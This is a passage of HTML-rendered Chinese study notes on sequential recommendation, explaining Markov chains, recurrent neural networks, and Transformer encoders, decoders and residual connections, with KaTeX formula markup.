class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.19em;\"><span></span></span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"一阶马尔科夫链\"><a class=\"anchor\" href=\"#一阶马尔科夫链\">#</a> 一阶马尔科夫链</h3>\n<ul>\n<li>一阶马尔可夫链假设系统的下一个状态只依赖于当前状态。这在序列推荐系统中意味着，用户的下一次操作只取决于他们的最近一次操作。</li>\n<li>** 状态表示：** 将用户的每一个操作视为一个状态。例如，用户购买的商品或浏览的网页。</li>\n<li>** 转移概率矩阵：** 创建一个矩阵，表示从一个状态转移到另一个状态的概率。矩阵中的每个元素<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">P_{ij}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 表示从状态<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 转移到状态<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span></span></span></span> 的概率。</li>\n<li><strong>概率计算</strong>：通过统计历史数据，计算从每个状态转移到其他状态的频率。例如，如果用户最近购买了商品 A，那么我们统计他们接下来购买商品 B 的频率来估计转移概率。</li>\n<li><strong>预测下一状态</strong>：根据当前状态（用户的最近一次操作），利用转移概率矩阵预测用户的下一次操作。例如，如果当前状态是商品 A，查看矩阵中与商品 A 对应的行，选择转移概率最高的商品作为预测结果。</li>\n</ul>\n<h3 id=\"高阶马尔科夫链\"><a class=\"anchor\" href=\"#高阶马尔科夫链\">#</a> 高阶马尔科夫链</h3>\n<ul>\n<li>** 功能：** 将用户的每一个操作视为一个状态，并将一系列连续的操作视为一个组合状态。例如，用户最近连续购买了商品 A、B 和 C，这个组合状态可以表示为 (A, B, C)。高阶马尔可夫链假设系统的下一个状态不仅依赖于当前状态，还依赖于前几个状态。这在序列推荐系统中意味着，用户的下一次操作取决于他们的多个最近操作。</li>\n<li><strong>状态表示</strong>：将用户的每一个操作视为一个状态，并将一系列连续的操作视为一个组合状态。例如，用户最近连续购买了商品 A、B 和 C，这个组合状态可以表示为 (A, B, C)。</li>\n<li><strong>转移概率矩阵</strong>：创建一个更复杂的转移概率矩阵，表示从一个组合状态转移到下一个状态的概率。矩阵中的每个元素<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mi>j</mi><mi>k</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">P_{ijk}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 表示从状态组合<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>i</mi><mo separator=\"true\">,</mo><mi>j</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(i,j)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">i</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mclose\">)</span></span></span></span> 转移到状态<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 的概率</li>\n<li><strong>概率计算</strong>：通过统计历史数据，计算从每个组合状态转移到其他状态的频率。例如，如果用户最近购买了商品 A 和 B，那么我们统计他们接下来购买商品 C 的频率来估计转移概率。</li>\n<li><strong>预测下一状态</strong>：根据当前组合状态（用户的最近几次操作），利用转移概率矩阵预测用户的下一次操作。例如，如果当前组合状态是 (A, B)，查看矩阵中与 (A, B) 对应的行，选择转移概率最高的商品作为预测结果。</li>\n</ul>\n<h2 id=\"递归神经网络recurrent-neural-network-rnn\"><a class=\"anchor\" href=\"#递归神经网络recurrent-neural-network-rnn\">#</a> 递归神经网络（Recurrent Neural Network, RNN）</h2>\n<p>递归神经网络（Recurrent Neural Network, RNN）是一类用于处理序列数据的神经网络。与传统的前馈神经网络不同，RNN 具有记忆能力，可以处理和分析时间序列数据，捕捉数据中的时间依赖关系和顺序信息。RNN 在自然语言处理、语音识别、时间序列预测等领域有广泛的应用。</p>\n<h3 id=\"基本结构\"><a class=\"anchor\" href=\"#基本结构\">#</a> 基本结构</h3>\n<p>RNN 的基本结构包括输入层、隐藏层和输出层。与传统神经网络不同的是，RNN 的隐藏层不仅接收当前时间步的输入，还接收前一个时间步的隐藏状态。具体来说：</p>\n<ul>\n<li>\n<p><strong>输入层</strong>：接收序列数据的当前时间步输入<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">x_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>。</p>\n</li>\n<li>\n<p><strong>隐藏层</strong>：计算当前时间步的隐藏状态<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>h</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">h_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，同时考虑当前输入<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">x_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和前一个时间步的隐藏状态 $ h_{t-1}$</p>\n</li>\n<li>\n<p><strong>输出层</strong>：根据当前隐藏状态<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>h</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">h_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 计算输出<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>y</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">y_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></p>\n</li>\n<li>\n<p>隐藏状态的更新公式如下：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>h</mi><mi>t</mi></msub><mo>=</mo><mi>σ</mi><mo stretchy=\"false\">(</mo><msub><mi>W</mi><mrow><mi>x</mi><mi>h</mi></mrow></msub><msub><mi>x</mi><mi>t</mi></msub><mo>+</mo><msub><mi>W</mi><mrow><mi>h</mi><mi>h</mi></mrow></msub><msub><mi>h</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>b</mi><mi>h</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">h_t=\\sigma(W_{xh}x_t+W_{hh}h_{t-1}+b_h)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span><span class=\"mord mathnormal mtight\">h</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.902771em;vertical-align:-0.208331em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">h</span><span class=\"mord mathnormal mtight\">h</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.301108em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.208331em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">h</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>其中，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mrow><mi>x</mi><mi>h</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">W_{xh}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span><span class=\"mord mathnormal mtight\">h</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mrow><mi>h</mi><mi>h</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">W_{hh}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">h</span><span class=\"mord mathnormal mtight\">h</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是权重矩阵，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>b</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">b_n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是偏置向量，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>σ</mi></mrow><annotation encoding=\"application/x-tex\">\\sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span></span></span></span> 是激活函数（如 tanh 或 ReLU）</p>\n</li>\n</ul>\n<h3 id=\"优势\"><a class=\"anchor\" href=\"#优势\">#</a> 优势</h3>\n<ol>\n<li><strong>捕捉时间依赖</strong>：RNN 能够处理序列数据，捕捉其中的时间依赖关系，使其在处理时间序列数据和自然语言处理任务中表现良好。</li>\n<li><strong>参数共享</strong>：RNN 的权重在每个时间步共享，减少了模型参数的数量，使其在处理长序列数据时更加高效。</li>\n</ol>\n<h3 id=\"局限性\"><a class=\"anchor\" href=\"#局限性\">#</a> 局限性</h3>\n<ol>\n<li><strong>梯度消失和梯度爆炸</strong>：在处理长序列数据时，RNN 可能会遇到梯度消失或梯度爆炸的问题，使得模型难以训练。</li>\n<li><strong>长时间依赖捕捉困难</strong>：标准 RNN 在处理长时间依赖关系时表现不佳。</li>\n</ol>\n<h2 id=\"顺序推荐\"><a class=\"anchor\" href=\"#顺序推荐\">#</a> 顺序推荐</h2>\n<h3 id=\"目标\"><a class=\"anchor\" href=\"#目标\">#</a> 目标</h3>\n<p>将用户行为的个性化模型（基于历史活动）与用户最近行为的 “上下文” 概念结合起来进行推荐。</p>\n<h3 id=\"前人方式\"><a class=\"anchor\" href=\"#前人方式\">#</a> 前人方式</h3>\n<ul>\n<li>\n<p>马尔科夫链假设下一个动作仅由以前一个动作（或前几个动作）为条件，并已成功地用于表征推荐的短距离项目转换。</p>\n</li>\n<li>\n<p><strong>递归神经网络 RNN</strong>：RNN 是一种用于处理序列数据的神经网络，具有记忆能力，可以捕捉序列数据中的时间依赖关系。RNN 的基本结构包括输入层、隐藏层和输出层，其中隐藏层的状态会根据前一个时间步的隐藏状态和当前时间步的输入来更新</p>\n</li>\n</ul>\n<h2 id=\"transformer\"><a class=\"anchor\" href=\"#transformer\">#</a> Transformer</h2>\n<h3 id=\"介绍\"><a class=\"anchor\" href=\"#介绍\">#</a> 介绍</h3>\n<p>Transformer 是一种用于处理序列数据的深度学习模型，特别擅长于自然语言处理任务，如机器翻译、文本生成等。它由一个编码器（Encoder）和一个解码器（Decoder）组成。</p>\n<h3 id=\"编码器encoder\"><a class=\"anchor\" href=\"#编码器encoder\">#</a> 编码器（Encoder）</h3>\n<p>编码器的任务是接收输入序列（例如，一个句子），并将其转换为一组特征表示。编码器包含多个层，每层都有两个主要部分：</p>\n<ol>\n<li><strong>自注意力层（Self-Attention Layer）</strong>：用于计算每个词与其他词的相关性。</li>\n<li><strong>前馈神经网络层（Feed-Forward Neural Network）</strong>：对自注意力层的输出进行进一步处理。</li>\n</ol>\n<p>每一层都有一个 “残差连接”（Residual Connection）和 “层归一化”（Layer Normalization）来帮助训练更深的网络。</p>\n<h3 id=\"解码器decoder\"><a class=\"anchor\" href=\"#解码器decoder\">#</a> 解码器（Decoder）</h3>\n<p>解码器的任务是根据编码器的输出生成目标序列（例如，翻译后的句子）。解码器也包含多个层，每层与编码器类似，但增加了一个 “编码器 - 解码器注意力层”（Encoder-Decoder Attention Layer），用来关注编码器的输出。</p>\n<h3 id=\"残差连接residual-connection\"><a class=\"anchor\" href=\"#残差连接residual-connection\">#</a> 残差连接（Residual Connection）</h3>\n<h4 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h4>\n<p>残差连接是一种深度神经网络的技术，通过在每个层之间引入直接的跳跃连接来帮助训练更深层的网络。具体来说，残差连接将输入直接添加到输出上，即：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi mathvariant=\"bold\">y</mi><mo>=</mo><mi mathvariant=\"script\">F</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"bold\">x</mi><mo stretchy=\"false\">)</mo><mo>+</mo><mi mathvariant=\"bold\">x</mi></mrow><annotation encoding=\"application/x-tex\">\\mathbf{y}=\\mathcal{F}(\\mathbf{x})+\\mathbf{x}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.63888em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">y</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.09931em;\">F</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathbf\">x</span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.44444em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathbf\">x</span></span></span></span></span></span></p>\n<p>其中，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"bold\">x</mi></mrow><annotation encoding=\"application/x-tex\">\\mathbf{x}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.44444em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathbf\">x</span></span></span></span></span> 是输入，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">F</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"bold\">x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">\\mathcal{F}(\\mathbf{x})</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.09931em;\">F</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathbf\">x</span></span><span class=\"mclose\">)</span></span></span></span> 是一个或多个层的非线性变换，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"bold\">y</mi></mrow><annotation encoding=\"application/x-tex\">\\mathbf{y}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.63888em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">y</span></span></span></span></span> 是输出。</p>\n<h4 id=\"优点\"><a class=\"anchor\" href=\"#优点\">#</a> 优点</h4>\n<ol>\n<li><strong>解决梯度消失问题</strong>：在深层网络中，梯度可能会在传播过程中逐渐消失，使得前面的层无法得到有效更新。残差连接通过直接传递梯度，缓解了这个问题。</li>\n<li><strong>加速训练</strong>：残差连接提供了一条无需学习的捷径，使得网络更容易学习到有效的表示，从而加速训练过程。</li>\n<li><strong>提高准确性</strong>：在很多应用中，使用残差连接的网络（如 ResNet）在准确性上有显著提升。</li>\n</ol>\n<h4 id=\"应用\"><a 